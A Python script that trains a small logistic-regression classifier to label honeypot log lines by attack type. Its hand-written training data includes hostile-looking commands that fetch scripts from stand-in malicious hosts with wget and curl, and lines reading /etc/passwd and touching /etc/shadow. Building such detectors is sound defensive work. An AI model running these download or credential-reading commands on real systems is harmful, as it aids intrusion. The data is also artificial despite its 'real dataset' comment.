# train_attack_classifier.py

import pandas as pd
from sklearn.model_selection import StratifiedShuffleSplit
from sklearn.feature_extraction.text import TfidfVectorizer
from sklearn.linear_model import LogisticRegression
from sklearn.metrics import classification_report
import joblib

# Real dataset based on your actual project experiments
data = {
    'log_message': [
        # Brute Force
        "Login attempt for root with password '123456'",
        "SSH login failed for admin from 192.168.1.10",
        "Hydra brute force detected: login root attempt",
        "Failed password for ubuntu user at port 22",
        "Multiple invalid logins from IP 10.0.0.5",

        # Fake Shell Interaction
        "Executed command: uname -a",
        "Executed command: ls -al /home",
        "Executed command: whoami",
        "User tried to run: cat /etc/passwd",
        "Shell input: cd /var/log",
        "Attempted to modify /etc/shadow file",
        "User listing files with 'ls' command",
        
        # Malware Upload
        "wget http://malicious.site/malware.sh",
        "curl -O http://example.com/fakescript.sh",
        "scp attackfile.sh pi@192.168.1.5:/tmp/",
        "Attempted upload using wget to /tmp/",
        "File download detected to /home/user/badscript.sh",
        "HTTP file transfer detected from attacker IP",
        "Attempted file upload using SCP over SSH",

        # Recon
        "Nmap scan detected on port 22 (SSH)",
        "ICMP Echo Request received (ping scan attempt)",
        "TCP Connect scan on Telnet port 23 detected",
        "Service probe attempt for SSH version",
        "Syn scan detected with half-open TCP handshakes",
        "Aggressive Nmap scanning behavior observed",
        
        # Internet Exposure
        "External IP attempted login as root with password 'admin'",
        "External IP tried multiple usernames: root, oracle, postgres",
        "SSH handshake attempted from public IP",
        "Failed Telnet login from external address",
        "Multiple failed password attempts from foreign IP"
    ],
    'attack_type': [
        "Brute Force", "Brute Force", "Brute Force", "Brute Force", "Brute Force",
        "Fake Shell Interaction", "Fake Shell Interaction", "Fake Shell Interaction", "Fake Shell Interaction", "Fake Shell Interaction",
        "Fake Shell Interaction", "Fake Shell Interaction",
        "Malware Upload", "Malware Upload", "Malware Upload", "Malware Upload", "Malware Upload",
        "Malware Upload", "Malware Upload",
        "Recon", "Recon", "Recon", "Recon", "Recon", "Recon",
        "Internet Exposure", "Internet Exposure", "Internet Exposure", "Internet Exposure", "Internet Exposure"
    ]
}

# Step 1: Create DataFrame
df = pd.DataFrame(data)

# Step 2: Vectorize
vectorizer = TfidfVectorizer()
X = vectorizer.fit_transform(df['log_message'])
y = df['attack_type']

# Step 3: Stratified Train-Test Split
sss = StratifiedShuffleSplit(n_splits=1, test_size=0.3, random_state=42)
for train_idx, test_idx in sss.split(X, y):
    X_train, X_test = X[train_idx], X[test_idx]
    y_train = y.iloc[train_idx]
    y_test = y.iloc[test_idx]

# Step 4: Train Model
model = LogisticRegression(max_iter=1000)
model.fit(X_train, y_train)

# Step 5: Evaluate
y_pred = model.predict(X_test)
print(classification_report(y_test, y_pred, zero_division=1))

# Step 6: Save Model and Vectorizer
joblib.dump(model, 'attack_classifier.pkl')
joblib.dump(vectorizer, 'vectorizer.pkl')

# Step 7: Demo Prediction
new_log = ["wget http://bad.com/malicious.sh"]
new_log_vectorized = vectorizer.transform(new_log)
predicted_attack_type = model.predict(new_log_vectorized)
print("Predicted Attack Type:", predicted_attack_type[0])

